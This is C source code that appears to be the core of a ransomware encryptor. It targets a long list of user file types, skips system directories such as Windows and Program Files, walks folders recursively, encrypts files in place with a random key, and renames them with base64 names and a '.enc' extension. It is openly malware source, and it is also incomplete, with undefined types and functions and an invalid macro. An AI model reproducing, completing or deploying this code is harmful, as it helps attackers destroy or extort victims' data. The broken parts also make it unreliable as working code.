#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/types.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <crypt.h>


#define KEY_SIZE 32
#define MAX_PATH 1024
#define MAX_FILE_SIZE int64_t(20 + 1e+6)
#define TEMP_DIR "./tmp/"
#define ENCRYPTED_EXTENSION ".enc"

const char *extensions[] = {
    // Text Files
    "doc", "docx", "msg", "odt", "wpd", "wps", "txt",
    // Data files
    "csv", "pps", "ppt", "pptx",
    // Audio Files
    "aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
    // Video Files
    "3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
    // 3D Image files
    "3dm", "3ds", "max", "obj", "blend",
    // Raster Image Files
    "bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
    // Vector Image files
    "ai", "eps", "ps", "svg",
    // Page Layout Files
    "pdf", "indd", "pct", "epub",
    // Spreadsheet Files
    "xls", "xlr", "xlsx",
    // Database Files
    "accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
    // Game Files
    "dem", "gam", "nes", "rom", "sav",
    // Temp Files
    "bkp", "bak", "tmp",
    // Config files
    "cfg", "conf", "ini", "prf",
    // Source files
    "html", "php", "js", "c", "cc", "py", "lua", "go", "java"
};

const char *skip_dir[] = {
    "ProgramData",
    "Windows",
    "bootmgr",
    "$WINDOWS.~BT",
    "Windows.old",
    "Temp",
    "tmp",
    "Program Files",
    "Program Files (x86)",
    "AppData",
    "$Recycle.Bin",
};


void generate_random_key(char *key) {
    if (RAND_bytes((unsigned char *)key, KEY_SIZE) != 1) {
        fprintf(stderr, "Error generating random key\n");
        exit(EXIT_FAILURE);
    }
}

int interessing_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');

    if (!dot || dot == filename) return 0;

    const char *ext = dot + 1;

    for (int i = 0; i < sizeof(extensions)/sizeof(extensions[0]); i++) {
        if (strcasecmp(ext, extensions[i]) == 0) {
            return 1;
        }
    }

    return 0;
}


int skip_directory(const char *path) {
    for (int i = 0; i < sizeof(skip_dir)/sizeof(skip_dir[0]); i++) {
        if (strstr(path, skip_dir[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}


size_t base64_encode(const unsigned char *in, size_t in_len, char *out) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *mem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, mem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);

    BIO_write(b64, in, in_len);
    BIO_flush(b64);

    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    memcpy(out, bptr->data, bptr->length);

    BIO_free_all(b64);
    return bptr->length;
}


void process_file(const char *filepath, const char *key) {
    File file;
    strncpy(file.path, filepath, sizeof(file.path) - 1);
    file.path[sizeof(file.path) - 1] = '\0';
    stat(filepath, &file.file_info);

    char temp_path[MAX_PATH];
    snprintf(temp_path, sizeof(temp_path), TEMP_DIR "%s.tmp", basename(file.path));

    printf("Encrypting: %s -> %s\n", file.path, temp_path);

    if (replace_by(&file, temp_path, key) != 0) {
        fprintf(stderr, "Failed to encrypt: %s\n", file.path);
        return;
    }

    if (rename(temp_path, file.path) != 0) {
        perror("Failed to replace original file");
        remove(temp_path);
        return;
    }

    char encoded[MAX_PATH * 2];
    char *filename = basename(file.path);
    size_t len = base64_encode((const unsigned char *)filename, strlen(filename), encoded);
    encoded[len] = '\0';

    char newpath[MAX_PATH * 2];
    snprintf(newpath, sizeof(newpath), "%s/%s%s", dirname((char *)filepath), encoded, ENCRYPTED_EXTENSION);

    if (rename(file.path, newpath) != 0) {
        perror("Failed to rename file");
    } else {
        printf("Renamed: %s -> %s\n", file.path, newpath);
    }
}


void walk_encrypt(const char *dir, const char *key) {
    DIR *dp = opendir(dir);
    
    if (!dp) {
        perror("Error opening directory");
        return;
    }

    struct dirent *entry;
    char fullpath[MAX_PATH];

    while ((entry = readdir(dp)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dir, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) != 0) {
            perror("stat failed");
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (!skip_directory(entry->d_name)) {
                walk_encrypt(fullpath, key);
            }
        } else if (S_ISREG(st.st_mode) && interessing_extension(entry->d_name)) {
            process_file(fullpath, key);
        }
    }

    closedir(dp);
}